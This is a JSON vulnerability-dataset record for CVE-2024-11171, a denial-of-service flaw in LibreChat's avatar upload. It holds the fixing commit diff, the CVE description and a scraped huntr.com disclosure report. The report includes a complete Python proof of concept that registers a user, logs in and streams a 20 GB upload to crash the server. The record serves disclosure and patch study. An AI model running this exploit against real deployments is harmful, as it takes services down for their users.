{
    "CVE-2024-11171": {
        "published_date": "2025-03-20T10:10:18.684Z",
        "patch_commits": [
            {
                "url": "https://github.com/danny-avila/librechat/commit/bb58a2d0662ef86dc75a9d2f6560125c018e3836",
                "content": "fix: refactor avatar upload handling to use fs for file reading and enhance file validation\n\nFilename: api/server/routes/files/avatar.js:\n```\n@@ -1,17 +1,18 @@\n-const multer = require('multer');\n+const fs = require('fs').promises;\n const express = require('express');\n const { getStrategyFunctions } = require('~/server/services/Files/strategies');\n const { resizeAvatar } = require('~/server/services/Files/images/avatar');\n+const { filterFile } = require('~/server/services/Files/process');\n const { logger } = require('~/config');\n \n-const upload = multer();\n const router = express.Router();\n \n-router.post('/', upload.single('input'), async (req, res) => {\n+router.post('/', async (req, res) => {\n   try {\n+    filterFile({ req, file: req.file, image: true, isAvatar: true });\n     const userId = req.user.id;\n     const { manual } = req.body;\n-    const input = req.file.buffer;\n+    const input = await fs.readFile(req.file.path);\n \n     if (!userId) {\n       throw new Error('User ID is undefined');\n```\n\nFilename: api/server/services/Files/process.js:\n```\n@@ -716,14 +716,15 @@\nasync function retrieveAndProcessFile({\n  * @param {number} [params.req.version]\n  * @param {Express.Multer.File} params.file - The file uploaded to the server via multer.\n  * @param {boolean} [params.image] - Whether the file expected is an image.\n+ * @param {boolean} [params.isAvatar] - Whether the file expected is a user or entity avatar.\n  * @returns {void}\n  *\n  * @throws {Error} If a file exception is caught (invalid file size or type, lack of metadata).\n  */\n-function filterFile({ req, file, image }) {\n+function filterFile({ req, file, image, isAvatar }) {\n   const { endpoint, file_id, width, height } = req.body;\n \n-  if (!file_id) {\n+  if (!file_id && !isAvatar) {\n     throw new Error('No file_id provided');\n   }\n\n@@ -732,20 +733,25 @@\nfunction filterFile({ req, file, image }) {\n   }\n \n   /* parse to validate api call, throws error on fail */\n-  isUUID.parse(file_id);\n+  if (!isAvatar) {\n+    isUUID.parse(file_id);\n+  }\n \n-  if (!endpoint) {\n+  if (!endpoint && !isAvatar) {\n     throw new Error('No endpoint provided');\n   }\n \n   const fileConfig = mergeFileConfig(req.app.locals.fileConfig);\n \n-  const { fileSizeLimit, supportedMimeTypes } =\n+  const { fileSizeLimit: sizeLimit, supportedMimeTypes } =\n     fileConfig.endpoints[endpoint] ?? fileConfig.endpoints.default;\n+  const fileSizeLimit = isAvatar === true ? fileConfig.avatarSizeLimit : sizeLimit;\n \n   if (file.size > fileSizeLimit) {\n     throw new Error(\n-      `File size limit of ${fileSizeLimit / megabyte} MB exceeded for ${endpoint} endpoint`,\n+      `File size limit of ${fileSizeLimit / megabyte} MB exceeded for ${\n+        isAvatar ? 'avatar upload' : `${endpoint} endpoint`\n+      }`,\n     );\n   }\n```"
            }
        ],
        "sw_version": "v0.7.6-rc1",
        "sw_version_wget": "https://github.com/danny-avila/librechat/archive/refs/tags/v0.7.6-rc1.zip",
        "description": "In danny-avila/librechat version git 0c2a583, there is an improper input validation vulnerability. The application uses multer middleware for handling multipart file uploads. When using in-memory storage (the default setting for multer), there is no limit on the upload file size. This can lead to a server crash due to out-of-memory errors when handling large files. An attacker without any privileges can exploit this vulnerability to cause a complete denial of service. The issue is fixed in version 0.7.6.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/91717a5a-d653-4e35-b186-9e8d00aa4285",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nNot limitation of upload file size, lead to server crash in danny-avila/librechat\nValid\nReported on Nov 5th 2024\nDescription\nlibrechat use multer, which is a middleware which handles streaming multipart fileupload. If use in memory storage(multer by default), can do not limit the upload file size, when handling big file, server will crash for out of memory. Attacker with no privilege can exploit this.\nProof of Concept\nUse this poc. set file_size to a number bigger than the server memory.\nimport requests\nimport random\nimport string\n\nfile_size = 1024 * 1024 * 1024 * 20\nserver_url = \"127.0.0.1\"\n\ndef create_multipart_content(boundary, file_size, chunk_size=409600):\n    yield f'--{boundary}\\r\\n'.encode('utf-8')\n    yield (\n        f'Content-Disposition: form-data; name=\"input\"; filename=\"avatar.png\"\\r\\n'\n        f'Content-Type: image/png\\r\\n\\r\\n'\n    ).encode('utf-8')\n    remaining = file_size\n    while remaining > 0:\n        current_chunk_size = min(chunk_size, remaining)\n        yield b'\\x00' * current_chunk_size\n        remaining -= current_chunk_size\n    yield b'\\r\\n'\n    yield f'--{boundary}--\\r\\n'.encode('utf-8')\nrandom_string = ''.join(random.choices(string.ascii_letters, k=8))\nurl1 = f'http://{server_url}:3080/api/auth/register'\nurl2 = f'http://{server_url}:3080/api/auth/login'\nurl3 = f'http://{server_url}:3080/api/files/images/avatar'\ndata = {\n    \"name\": random_string,\n    \"username\": random_string,\n    \"email\": f\"{random_string}@{random_string}.com\",\n    \"password\": random_string,\n    \"confirm_password\": random_string\n}\nheaders = {\n    \"X-Forwarded-For\": random_string\n}\nrequests.post(url1, json=data, headers=headers)\ndata = {\"email\":f\"{random_string}@{random_string}.com\",\"password\":random_string}\nresp = requests.post(url2, json=data, headers=headers)\ntoken = resp.json()[\"token\"]\nboundary = '----WebKitFormBoundaryHwxMKHMEvyB0Purt'\nheaders = {\n    'Authorization': f'Bearer {token}',\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',\n    'Content-Type': f'multipart/form-data; boundary={boundary}',\n}\n\nmultipart_generator = create_multipart_content(boundary, file_size)\nrequests.post(url3, headers=headers, data=multipart_generator)\nafter the poc, the server will be killed by OS. Cause complete denial of server.\nImpact\nAttacker without any privilege can cause the server to crash.\nOccurrences\navatar.js L7\nReferences\nWARNING: Uploading very large files, or relatively small files in large numbers very quickly, can cause your application to run out of memory when memory storage is used.\nWe are processing your report and will contact thedanny-avila/librechat team within 24 hours.6 months ago\nhuntr-helper\ncommented6 months ago\nAdmin\nThis report was determined to possibly be out of scope or have a high likelyhood of being marked as informative.\nPlease review your report and the Participation Guidelines.\nThese are the specific guidelines this report is in possible violation of:\nLack of rate limiting issues.\noicu0619\ncommented6 months ago\nResearcher\nThis is not related to rate limiting. One request will crash the server.\nDanny Avila validated this vulnerability6 months ago\noicu0619has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11171assigned to this report.6 months ago\nDanny Avilamarked this as fixedin 0.7.6with commitbb58a26 months ago\nDanny Avilahas been awarded the fix bounty\navatar.js#L7 has been validated\nWe have sent a warning to the danny-avila/librechat team to inform them that this report will be published in 48 hours3 months ago\nThis vulnerability has now been published3 months ago\nCVE-2024-11171has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11171\n(Published)\nVulnerability Type\nCWE-20: Improper Input Validation\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\ngit 0c2a583\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The security advisory explicitly provides a proof of concept (PoC) with code and scenarios that demonstrate the vulnerability's exploited behavior."
            }
        ],
        "cwe": [
            {
                "id": "CWE-20",
                "value": "CWE-20 Improper Input Validation"
            }
        ]
    }
}